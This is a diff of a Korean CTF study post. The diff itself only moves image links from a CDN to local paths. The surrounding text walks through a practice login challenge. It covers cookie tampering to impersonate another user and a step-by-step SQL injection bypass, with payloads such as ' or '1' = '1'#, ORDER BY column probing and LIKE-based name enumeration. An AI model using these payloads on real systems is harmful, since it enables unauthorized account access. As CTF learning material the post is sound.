@@ -17,40 +17,40 @@ tags: [TIL, WEB, DATABASE, CTF]
 1. 
 id: doldol
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-7.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-07.png)
 response에서 Set-Cookie: loginUser = doldol이 보인다
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-8.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-08.png)
 2. response를 탈취해서 loginUser를 normaltic5로 변경하겠다
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-9.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-09.png)
 
 # Secret Login
 1. 
 id: doldol
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-3.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-03.png)
 -> login.php과 logout.php에서 302 응답 코드가 보인다.
 -> 다른 페이지로 이동시켜준다는 뜻
 2. 
 id: doldol' and '1' ='1
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-04.png)
 -> sql injection이 가능하다
 -> 괄호 X
 3. 
 id: doldol'#
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-04.png)
 -> 주석 처리 가능
 4. 
 id: doldol'#
 pw: asdf
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-04.png)
 -> 식별과 인증 동시에 하는 듯
 sql: select id, pw from table where id = 'id' and pw = 'pw'
 5. 
 id: ' or '1' = '1'#
 pw: asdf
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-5.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-05.png)
 -> ' or '1' = '1'#이렇게 하면 모든 row를 다 챙겨오는 데 하나 밖에 안 보여지다보니 가장 첫 번째 row만 보여지는 듯
 6. 
 id: login_acc' #
@@ -61,11 +61,11 @@ pw: asdf
 7. 
 id: login_acc' or '1' = '1' #
 pw: asdf
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-5.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-05.png)
 8. 
 id: ' or '1' = '1' order by 1, 2, 3 #
 pw: asdf
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-5.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-05.png)
 -> 아이디, 패스워드, 사용자 이름이 있다고 가정하고 시작
 ... 하나씩 늘려보는 중 ...
 8. 
@@ -99,7 +99,7 @@ pw: asdf
 14. 
 id: ' or '1' = '1' AND name = 'login_acc' #
 pw: asdf
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-5.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-05.png)
 -> 표시되는 게 유저명인 게 확실해졌고
 -> column이 name이라는 것도 확인했다
 -> 그렇지만 admin은 아니라는 거
@@ -117,8 +117,8 @@ pw: asdf
 17. 
 id: ' or name like '%a%' #
 pw: asdf
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-5.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-05.png)
 18. 
 id: ' or name like '%e%' #
 pw: asdf
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-6.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-06.png)
